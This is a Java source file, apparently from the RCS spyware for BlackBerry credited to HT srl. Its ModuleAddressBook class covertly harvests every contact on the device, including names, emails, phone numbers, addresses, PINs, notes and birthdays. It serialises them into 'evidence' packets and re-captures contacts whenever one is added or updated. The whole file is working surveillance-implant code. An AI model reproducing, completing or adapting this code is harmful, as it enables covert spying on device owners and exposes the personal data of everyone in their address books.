//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ImAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import java.util.Date;
import java.util.Enumeration;

import javax.microedition.pim.Contact;
import javax.microedition.pim.ContactList;
import javax.microedition.pim.PIM;
import javax.microedition.pim.PIMException;
import javax.microedition.pim.PIMItem;

import net.rim.blackberry.api.pdap.BlackBerryContact;
import net.rim.blackberry.api.pdap.BlackBerryPIMList;
import net.rim.blackberry.api.pdap.PIMListListener;
import net.rim.device.api.util.DataBuffer;
import blackberry.Messages;
import blackberry.config.ConfModule;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.evidence.Markup;
import blackberry.fs.Path;
import blackberry.interfaces.UserAgent;
import blackberry.manager.ModuleManager;
import blackberry.utils.Utils;

/**
 * The Class ImAgent.
 */
public final class ModuleAddressBook extends BaseModule implements
        PIMListListener, UserAgent {
    //#ifdef DEBUG
    static Debug debug = new Debug("ModAddress", DebugLevel.INFORMATION); //$NON-NLS-1$
    //#endif

    Markup markup;
    protected static final int SLEEPTIME = 3000;
    protected static final int PERIODTIME = 60 * 60 * 1000;

    private static final int POOM_STRING_SUBJECT = 0x01000000;
    private static final int POOM_STRING_CATEGORIES = 0x02000000;
    private static final int POOM_STRING_BODY = 0x04000000;
    private static final int POOM_STRING_RECIPIENTS = 0x08000000;
    private static final int POOM_STRING_LOCATION = 0x10000000;
    private static final int POOM_OBJECT_RECUR = 0x80000000;

    byte[] examplePacket;

    final int version = 0x01000000;

    public static String getStaticType() {
        return Messages.getString("1d.0");//"addressbook"; //$NON-NLS-1$
    }

    public static ModuleAddressBook getInstance() {
        return (ModuleAddressBook) ModuleManager.getInstance().get(
                getStaticType());
    }

    public boolean parse(ConfModule conf) {
        markup = new Markup(this);

        setDelay(SLEEPTIME);
        setPeriod(PERIODTIME);
        return true;
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart: add listener"); //$NON-NLS-1$
        //#endif

        final PIM pim = PIM.getInstance();
        BlackBerryPIMList list;
        try {
            list = (BlackBerryPIMList) pim.openPIMList(PIM.CONTACT_LIST,
                    PIM.READ_ONLY);
            list.addListener(this);

        } catch (final PIMException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }

    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop: remove listener"); //$NON-NLS-1$
        //#endif

        final PIM pim = PIM.getInstance();
        BlackBerryPIMList list;
        try {
            list = (BlackBerryPIMList) pim.openPIMList(PIM.CONTACT_LIST,
                    PIM.READ_ONLY);
            list.removeListener(this);

        } catch (final PIMException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualLoop() {
        //#ifdef DEBUG
        debug.trace("actualRun"); //$NON-NLS-1$
        //#endif

        if (!markup.isMarkup()) {
            //#ifdef DEBUG
            debug.info("actualLoop: getting Contact List"); //$NON-NLS-1$
            //#endif

            if (getContactList()) {
                //#ifdef DEBUG
                debug.trace("actualRun: need to write markup"); //$NON-NLS-1$
                //#endif
                markup.createEmptyMarkup();
            }
        }
    }

    private boolean getContactList() {
        ContactList contactList;
        int number = 0;

        String[] lists = PIM.getInstance().listPIMLists(PIM.CONTACT_LIST);
        //#ifdef DEBUG
        debug.trace("getContactList lists: " + lists.length); //$NON-NLS-1$
        //#endif

        boolean ret = true;

        for (int i = 0; i < lists.length; i++) {
            try {
                String name = lists[i];
                //#ifdef DEBUG
                debug.trace("getContactList: opening " + name); //$NON-NLS-1$
                //#endif
                contactList = (ContactList) PIM.getInstance().openPIMList(
                        PIM.CONTACT_LIST, PIM.READ_ONLY, name);

                number = saveContactEvidence(contactList);
                //#ifdef DEBUG
                debug.trace("getContactList: saved " + number); //$NON-NLS-1$
                //#endif

            } catch (final PIMException e) {
                //#ifdef DEBUG
                debug.error(e);
                //#endif

                ret = false;
            }
        }
        return ret;

    }

    private void save(Contact item) {
        try {
            //#ifdef DEBUG
            debug.trace("save: " + item);
            //#endif

            final ContactList contactList = (ContactList) item.getPIMList();
            final BlackBerryContact contact = (BlackBerryContact) item;
            final byte[] payload = getContactPacket(contactList, contact);

            Evidence evidence = new Evidence(EvidenceType.ADDRESSBOOK);
            evidence.atomicWriteOnce(payload);

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }
    }

    private int saveContactEvidence(ContactList contactList)
            throws PIMException {
        final Enumeration eContacts = contactList.items();

        //#ifdef DEBUG
        debug.trace("saveContactEvidence: got contacts"); //$NON-NLS-1$
        //#endif

        Evidence evidence = new Evidence(EvidenceType.ADDRESSBOOK);
        evidence.createEvidence();

        Contact contact;
        int number = 0;
        while (eContacts.hasMoreElements()) {
            //#ifdef DEBUG
            debug.trace("saveContactEvidence: contact #" + ++number); //$NON-NLS-1$
            //#endif
            try {
                contact = (Contact) eContacts.nextElement();
                final byte[] packet = getContactPacket(contactList, contact);
                evidence.writeEvidence(packet);
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }

        //#ifdef DEBUG
        debug.trace("saveContactEvidence: finished contacts. Total: " + number); //$NON-NLS-1$
        //#endif
        evidence.close();

        return number;
    }

    /**
     * HomeAddressStreet = 0x21, HomeAddressCity = 0x22, HomeAddressState =
     * 0x23, HomeAddressPostalCode = 0x24, HomeAddressCountry = 0x25,
     * OtherAddressStreet = 0x26, OtherAddressCity = 0x27, OtherAddressState =
     * 0x2F, OtherAddressPostalCode = 0x28, OtherAddressCountry = 0x29,
     * BusinessAddressStreet = 0x2A, BusinessAddressCity = 0x2B,
     * BusinessAddressState = 0x2C, BusinessAddressPostalCode = 0x2D,
     * BusinessAddressCountry = 0x2E,
     * 
     * @param contactList
     * @param version
     * @param contact
     * @return
     */
    private byte[] getContactPacket(ContactList contactList, Contact contact) {

        //final byte[] header = new byte[12];
        //final byte[] payload = new byte[12];

        final DataBuffer dbPayload = new DataBuffer(false);
        initCustomFields();

        final String[] categories = contact.getCategories();
        for (int i = 0; i < categories.length; i++) {
            //#ifdef DEBUG
            debug.trace("getContactPacket cat: " + categories[i]); //$NON-NLS-1$
            //#endif
        }

        int uid = 0;

        if (contactList.isSupportedField(Contact.UID)) {
            if (contact.countValues(Contact.UID) > 0) {
                final String suid = contact.getString(Contact.UID, 0);
                //#ifdef DEBUG
                debug.info("getContactPacket uid: " + suid); //$NON-NLS-1$
                //#endif
                try {
                    uid = Integer.parseInt(suid);
                } catch (final NumberFormatException ex) {
                    //#ifdef DEBUG
                    debug.error(ex);
                    //#endif
                }
            }
        }

        dbPayload.writeInt(0);
        dbPayload.writeInt(version);
        dbPayload.writeInt(uid);

        //#ifdef DEBUG
        debug.trace("getContactPacket: name"); //$NON-NLS-1$
        //#endif
        if (contactList.isSupportedField(Contact.NAME)) {
            if (contact.countValues(Contact.NAME) > 0) {
                final String[] names = contact.getStringArray(Contact.NAME, 0);

                addField(dbPayload, names, Contact.NAME_GIVEN, (byte) 0x01);
                addField(dbPayload, names, Contact.NAME_FAMILY, (byte) 0x02);
            }
        }

        //#ifdef DEBUG
        debug.trace("getContactPacket: email"); //$NON-NLS-1$
        //#endif
        addEmailField(contactList, contact, dbPayload, Contact.EMAIL,
                new byte[] { 0x06, 0x0D, 0x0F });

        //#ifdef DEBUG
        debug.trace("getContactPacket: tel"); //$NON-NLS-1$
        //#endif
        addTelField(contactList, contact, dbPayload, Contact.TEL, (byte) 0x07);

        //#ifdef DEBUG
        debug.trace("getContactPacket: addr"); //$NON-NLS-1$
        //#endif
        if (contactList.isSupportedField(Contact.ADDR)) {
            int numAddress = contact.countValues(Contact.ADDR);

            //#ifdef DEBUG
            debug.trace("getContactPacket, num addresses: " + numAddress); //$NON-NLS-1$
            //#endif

            for (int i = 0; i < numAddress; i++) {
                final String[] addr = contact.getStringArray(Contact.ADDR, i);

                int attribute = contact
                        .getAttributes(BlackBerryContact.ADDR, i);
                if (attribute == BlackBerryContact.ATTR_HOME) {
                    //#ifdef DEBUG
                    debug.trace("getContactPacket addr home"); //$NON-NLS-1$
                    //#endif

                    addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x21);
                    addField(dbPayload, addr, Contact.ADDR_LOCALITY,
                            (byte) 0x22);
                    addField(dbPayload, addr, Contact.ADDR_REGION, (byte) 0x23);
                    addField(dbPayload, addr, Contact.ADDR_POSTALCODE,
                            (byte) 0x24);
                    addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x25);

                } else if (attribute == BlackBerryContact.ATTR_WORK) {
                    //#ifdef DEBUG
                    debug.trace("getContactPacket addr work"); //$NON-NLS-1$
                    //#endif
                    addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x2A);
                    addField(dbPayload, addr, Contact.ADDR_LOCALITY,
                            (byte) 0x2B);
                    addField(dbPayload, addr, Contact.ADDR_REGION, (byte) 0x2C);
                    addField(dbPayload, addr, Contact.ADDR_POSTALCODE,
                            (byte) 0x2D);
                    addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x2E);
                } else {
                    //#ifdef DEBUG
                    debug.trace("getContactPacket addr other"); //$NON-NLS-1$
                    //#endif
                    addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x26);
                    addField(dbPayload, addr, Contact.ADDR_LOCALITY,
                            (byte) 0x26);
                    addField(dbPayload, addr, Contact.ADDR_REGION, (byte) 0x2F);
                    addField(dbPayload, addr, Contact.ADDR_POSTALCODE,
                            (byte) 0x28);
                    addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x29);
                }

                addField(dbPayload, addr, Contact.ADDR_POBOX, (byte) 0x2D);
                addField(dbPayload, addr, Contact.ADDR_EXTRA, (byte) 0x36);

            }
        }

        //#ifdef DEBUG
        debug.trace("getContactPacket: pin"); //$NON-NLS-1$
        //#endif
        addCustomField(contactList, contact, BlackBerryContact.PIN,
                Messages.getString("1d.24")); //$NON-NLS-1$

        //#ifdef DEBUG
        debug.trace("getContactPacket: users"); //$NON-NLS-1$
        //#endif
        addCustomField(contactList, contact, BlackBerryContact.USER1,
                Messages.getString("1d.26")); //$NON-NLS-1$
        addCustomField(contactList, contact, BlackBerryContact.USER2,
                Messages.getString("1d.27")); //$NON-NLS-1$
        addCustomField(contactList, contact, BlackBerryContact.USER3,
                Messages.getString("1d.28")); //$NON-NLS-1$
        addCustomField(contactList, contact, BlackBerryContact.USER4,
                Messages.getString("1d.29")); //$NON-NLS-1$

        //#ifdef DEBUG
        debug.trace("getContactPacket: org"); //$NON-NLS-1$
        //#endif
        addCustomField(contactList, contact, BlackBerryContact.ORG,
                Messages.getString("1d.31")); //$NON-NLS-1$

        //#ifdef DEBUG
        debug.trace("getContactPacket: note"); //$NON-NLS-1$
        //#endif
        addCustomField(contactList, contact, BlackBerryContact.NOTE,
                Messages.getString("1d.33")); //$NON-NLS-1$

        //#ifdef DEBUG
        debug.trace("getContactPacket: anniversary"); //$NON-NLS-1$
        //#endif
        addCustomDateField(contactList, contact, BlackBerryContact.ANNIVERSARY,
                Messages.getString("1d.35")); //$NON-NLS-1$

        //#ifdef DEBUG
        debug.trace("getContactPacket: birthday"); //$NON-NLS-1$
        //#endif
        addCustomDateField(contactList, contact, BlackBerryContact.BIRTHDAY,
                Messages.getString("1d.37")); //$NON-NLS-1$

        finalizeCustomFields(dbPayload);

        final int size = dbPayload.getLength();

        //#ifdef DEBUG

        debug.trace("size len: " + size); //$NON-NLS-1$
        //#endif        

        // a questo punto il payload e' pronto, scriviamo la size
        //dbPayload.trim(true);
        dbPayload.rewind();
        dbPayload.writeInt(size);

        byte[] packet = dbPayload.toArray();

        //#ifdef DEBUG
        debug.trace("packet: " + Utils.byteArrayToHex(packet)); //$NON-NLS-1$
        //#endif                

        return packet;
    }

    private void addField(DataBuffer dbPayload, String[] fields,
            int fieldNumber, byte logType) {

        try {
            if (fields[fieldNumber] != null) {
                final String value = fields[fieldNumber];
                Utils.addTypedString(dbPayload, logType, value);
            }
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }

    }

    /*
     * private void addField(ContactList contactList, Contact contact,
     * DataBuffer dbPayload, int contactType, byte logType) { if
     * (name[Contact.NAME_GIVEN] != null) { String first =
     * name[Contact.NAME_GIVEN]; Utils.addTypedString(db_payload, (byte) 0x01,
     * first); } if (contactList.isSupportedField(contactType)) { if
     * (contact.countValues(contactType) >= 0) { String value =
     * contact.getString(contactType, 0); //#ifdef DEBUG
     * debug.trace("addField: " + contactType + "," + logType + " " + value);
     * //#endif Utils.addTypedString(dbPayload, logType, value); } } }
     */
    private void addEmailField(ContactList contactList, Contact contact,
            DataBuffer dbPayload, int contactType, byte[] logTypes) {

        if (contactList.isSupportedField(contactType)) {
            try {
                final int preferred = contact.getPreferredIndex(contactType);
                //#ifdef DEBUG
                debug.trace("addStringField preferred : " + preferred); //$NON-NLS-1$
                //#endif           

                for (int i = 0; i < contact.countValues(contactType)
                        && i < logTypes.length; i++) {
                    final String value = contact.getString(contactType, i);
                    //#ifdef DEBUG
                    debug.trace("addStringField: " + logTypes[i] + " " + value); //$NON-NLS-1$ //$NON-NLS-2$
                    //#endif
                    Utils.addTypedString(dbPayload, logTypes[i], value);
                }

            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }
    }

    StringBuffer customBuffer = new StringBuffer();

    /**
     * La cosole accetta un solo custom field, quindi deve essere simulato
     * costruendo una stringa da serializzare solo nella finalize
     */
    private void initCustomFields() {
        //#ifdef DEBUG
        debug.trace("initCustomFields"); //$NON-NLS-1$
        //#endif
        customBuffer = new StringBuffer();
    }

    private void finalizeCustomFields(DataBuffer dbPayload) {
        //#ifdef DEBUG
        debug.trace("finalizeCustomFields"); //$NON-NLS-1$
        //#endif

        if (customBuffer == null) {
            //#ifdef DEBUG
            debug.error("finishCustomFields"); //$NON-NLS-1$
            //#endif
        } else {
            try {
                //#ifdef DEBUG
                debug.trace("finishCustomFields: " + customBuffer.toString()); //$NON-NLS-1$
                //#endif
                Utils.addTypedString(dbPayload, (byte) 0x37,
                        customBuffer.toString());
            } catch (Exception ex) {
                //#ifdef DEBUG
                debug.error("finalizeCustomFields: " + ex); //$NON-NLS-1$
                //#endif
            }
        }
    }

    protected void addCustomField(ContactList contactList, Contact contact,
            int contactType, String typeName) {

        if (contactList.isSupportedField(contactType)) {
            try {

                if (contact.countValues(contactType) > 0) {
                    final String value = contact.getString(contactType, 0);
                    customBuffer.append(typeName + value + "\r\n"); //$NON-NLS-1$
                }

            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }
    }

    protected void addCustomDateField(ContactList contactList, Contact contact,
            int contactType, String typeName) {

        if (contactList.isSupportedField(contactType)) {
            try {

                if (contact.countValues(contactType) > 0) {
                    final long value = contact.getDate(contactType, 0);
                    customBuffer.append(typeName + (new Date(value)).toString()
                            + "\r\n"); //$NON-NLS-1$
                }

            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }
    }

    protected void addTelField(ContactList contactList, Contact contact,
            DataBuffer dbPayload, int contactType, byte logType) {

        if (contactList.isSupportedField(contactType)) {
            try {
                final int preferred = contact.getPreferredIndex(contactType);
                //#ifdef DEBUG
                debug.trace("addStringField preferred : " + preferred); //$NON-NLS-1$
                //#endif

                if (contact.countValues(contactType) > 0) {
                    final String value = contact.getString(contactType, 0);
                    Utils.addTypedString(dbPayload, logType, value);
                }

                String note = ""; //$NON-NLS-1$
                final int last = contact.countValues(contactType) - 1;
                for (int i = 1; i <= last; i++) {
                    final String value = contact.getString(contactType, i);
                    //#ifdef DEBUG
                    debug.trace("addStringField: " + logType + " " + value); //$NON-NLS-1$ //$NON-NLS-2$
                    //#endif

                    note += value;
                    if (i < last) {
                        note += ", "; //$NON-NLS-1$
                    }
                }

                //#ifdef DEBUG
                debug.trace("addTelField note: " + note); //$NON-NLS-1$
                //#endif

                Utils.addTypedString(dbPayload, (byte) 0x34, note);
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }
    }

    public void itemAdded(PIMItem item) {
        init();
        //#ifdef DEBUG
        debug.info("itemAdded: " + item); //$NON-NLS-1$
        //#endif
        save((Contact) item);
    }

    public void itemRemoved(PIMItem item) {
        init();
        //#ifdef DEBUG
        debug.trace("itemRemoved: " + item); //$NON-NLS-1$
        //#endif
    }

    public void itemUpdated(PIMItem itemOld, PIMItem itemNew) {
        init();
        //#ifdef DEBUG
        debug.info("itemUpdated: " + itemNew); //$NON-NLS-1$
        //#endif

        save((Contact) itemNew);
    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }

}
